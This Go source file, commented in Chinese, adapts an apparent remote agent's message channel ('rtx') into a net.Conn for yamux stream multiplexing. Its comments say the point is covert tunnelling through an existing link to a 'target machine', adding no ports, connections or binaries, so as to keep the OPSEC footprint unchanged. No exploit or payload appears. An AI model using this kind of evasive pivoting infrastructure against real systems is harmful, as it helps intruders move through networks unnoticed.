// Package link — 把 rtx 的消息链路（4 字节长度 + JSON 帧）封装成 net.Conn，
// 供 yamux 之类的【流多路复用器】使用。
//
// 为什么需要这层：rtx 的控制通道是【消息】语义（Send/Recv 一条条 proto.Msg），
// 而多路复用器需要【字节流】语义（net.Conn）。适配之后，"穿透"就能复用
// 同一条已有连接：目标机上不新增监听端口、不新增连接、不新增第三方二进制
// （OPSEC 行为面零变化）。
//
// ⛔ 并发纪律（对应 rtx 已有的并发模型）：
//   - 入站：本包 **从不阻塞读循环**。主循环收到 MsgMux 后调 Hub.Handle 即返回；
//     数据进每通道的有界缓冲（sync.Cond + 字节预算），由 yamux 的读循环消费。
//     缓冲溢出 = **显式失败该通道**（rdE），绝不静默丢数据；也绝不反压读循环，
//     否则隧道流量会拖死 exec/bgstatus 这些控制消息（实测过的失效模式）。
//   - 出站：走调用方注入的 Sender（agent 侧已有 sendMu 串行化帧写入）。
package link

import (
	"bytes"
	"encoding/base64"
	"errors"
	"io"
	"net"
	"strconv"
	"sync"
	"time"

	"coreutil/internal/proto"
)

// Sender 是最小发送接口（agent/server 各自的链路都满足）。
type Sender interface {
	Send(*proto.Msg) error
}

// ChunkSize 单条 mux:data 消息承载的原始字节数（base64 后约 1.37 倍）。
const ChunkSize = 16 << 10

// MaxInboundBytes 每通道入站缓冲上限。溢出即显式失败该通道（见包注释）。
const MaxInboundBytes = 4 << 20

// ErrOverflow 入站缓冲溢出：对端发得比消费快。显式报错，不静默丢。
var ErrOverflow = errors.New("link: inbound buffer overflow (对端发得比消费快)")

// Hub 管理一条消息链路上的 mux 通道，由【唯一的读循环】喂入。
type Hub struct {
	send   Sender
	mu     sync.Mutex
	conns  map[uint32]*Conn
	accept chan *Conn
}

func NewHub(s Sender) *Hub {
	return &Hub{send: s, conns: make(map[uint32]*Conn), accept: make(chan *Conn, 4)}
}

// Handle 处理一条消息；返回 true 表示已被本包消费（调用方勿再当控制消息处理）。
// 本函数**不阻塞**。
func (h *Hub) Handle(m *proto.Msg) bool {
	if m.Type != proto.MsgMux {
		return false
	}
	switch m.MuxOp {
	case "open":
		h.mu.Lock()
		c := h.conns[m.MuxID]
		h.mu.Unlock()
		if c == nil {
			c = newConn(h, m.MuxID)
			h.mu.Lock()
			h.conns[m.MuxID] = c
			h.mu.Unlock()
			select {
			case h.accept <- c:
			default: // 无人 Accept：忽略，通道仍可被后续 data 复用
			}
		}
	case "data":
		h.mu.Lock()
		c := h.conns[m.MuxID]
		h.mu.Unlock()
		if c != nil {
			b, err := base64.StdEncoding.DecodeString(m.Data)
			if err == nil && len(b) > 0 {
				c.deliver(b)
			} else if err != nil {
				c.fail(errors.New("link: bad base64 payload"))
			}
		}
	case "close":
		h.mu.Lock()
		c := h.conns[m.MuxID]
		h.mu.Unlock()
		if c != nil {
			c.closeRemote()
		}
	}
	return true
}

// Dial 本侧发起一条通道（发 open 后返回）。
func (h *Hub) Dial(id uint32) (*Conn, error) {
	h.mu.Lock()
	if c := h.conns[id]; c != nil {
		h.mu.Unlock()
		return c, nil
	}
	c := newConn(h, id)
	h.conns[id] = c
	h.mu.Unlock()
	if err := h.send.Send(&proto.Msg{Type: proto.MsgMux, MuxID: id, MuxOp: "open"}); err != nil {
		_ = c.Close()
		return nil, err
	}
	return c, nil
}

// Accept 等待对端发起通道。
func (h *Hub) Accept() (*Conn, error) {
	c, ok := <-h.accept
	if !ok {
		return nil, io.EOF
	}
	return c, nil
}

// Forget 释放通道登记（读循环结束/重连时调用）。
func (h *Hub) Forget(id uint32) {
	h.mu.Lock()
	delete(h.conns, id)
	h.mu.Unlock()
}

func newConn(h *Hub, id uint32) *Conn {
	return &Conn{h: h, id: id, cond: sync.NewCond(&sync.Mutex{})}
}

// Conn 是一条 mux 通道的 net.Conn 视图。
type Conn struct {
	h        *Hub
	id       uint32
	buf      bytes.Buffer // 未读出的字节
	mu       sync.Mutex   // 保护 buf/bufBytes/rdE/closed
	cond     *sync.Cond   // 数据到达/关闭时唤醒 Read
	bufBytes int
	rdE      error
	closed   bool
	once     sync.Once
}

// deliver 由 Handle 调用：入队或（溢出时）显式失败。不阻塞。
func (c *Conn) deliver(b []byte) {
	c.cond.L.Lock()
	defer c.cond.L.Unlock()
	if c.closed || c.rdE != nil {
		return
	}
	if c.bufBytes+len(b) > MaxInboundBytes {
		c.rdE = ErrOverflow
		c.cond.Broadcast()
		return
	}
	c.buf.Write(b)
	c.bufBytes += len(b)
	c.cond.Broadcast()
}

func (c *Conn) fail(err error) {
	c.cond.L.Lock()
	if c.rdE == nil {
		c.rdE = err
	}
	c.cond.Broadcast()
	c.cond.L.Unlock()
}

func (c *Conn) closeRemote() {
	c.cond.L.Lock()
	if c.rdE == nil {
		c.rdE = io.EOF
	}
	c.cond.Broadcast()
	c.cond.L.Unlock()
}

// ---- net.Conn 实现 ----

func (c *Conn) Read(p []byte) (int, error) {
	c.cond.L.Lock()
	for c.buf.Len() == 0 && c.rdE == nil && !c.closed {
		c.cond.Wait()
	}
	if c.buf.Len() > 0 {
		n, err := c.buf.Read(p)
		c.bufBytes -= n
		c.cond.L.Unlock()
		return n, err
	}
	err := c.rdE
	if err == nil {
		err = io.EOF
	}
	c.cond.L.Unlock()
	return 0, err
}

func (c *Conn) Write(p []byte) (int, error) {
	total := 0
	for len(p) > 0 {
		n := len(p)
		if n > ChunkSize {
			n = ChunkSize
		}
		if err := c.h.send.Send(&proto.Msg{
			Type:  proto.MsgMux,
			MuxID: c.id,
			MuxOp: "data",
			Data:  base64.StdEncoding.EncodeToString(p[:n]),
		}); err != nil {
			return total, err
		}
		total += n
		p = p[n:]
	}
	return total, nil
}

func (c *Conn) Close() error {
	c.once.Do(func() {
		_ = c.h.send.Send(&proto.Msg{Type: proto.MsgMux, MuxID: c.id, MuxOp: "close"})
		c.cond.L.Lock()
		c.closed = true
		c.cond.Broadcast()
		c.cond.L.Unlock()
		c.h.Forget(c.id)
	})
	return nil
}

type muxAddr struct{ id uint32 }

func (a muxAddr) Network() string { return "rtx-mux" }
func (a muxAddr) String() string  { return "rtx-mux/" + strconv.FormatUint(uint64(a.id), 10) }

func (c *Conn) LocalAddr() net.Addr  { return muxAddr{c.id} }
func (c *Conn) RemoteAddr() net.Addr { return muxAddr{c.id} }

// ⚠️ 截止时间未实现（MVP）：yamux 的 keepalive/写超时因此不会在【链路静默死亡】时触发；
// 该场景由底层链路的 Send 失败与 agent 重连循环兜底（handleConn 返回 → 全量重建）。
func (c *Conn) SetDeadline(t time.Time) error      { return nil }
func (c *Conn) SetReadDeadline(t time.Time) error  { return nil }
func (c *Conn) SetWriteDeadline(t time.Time) error { return nil }
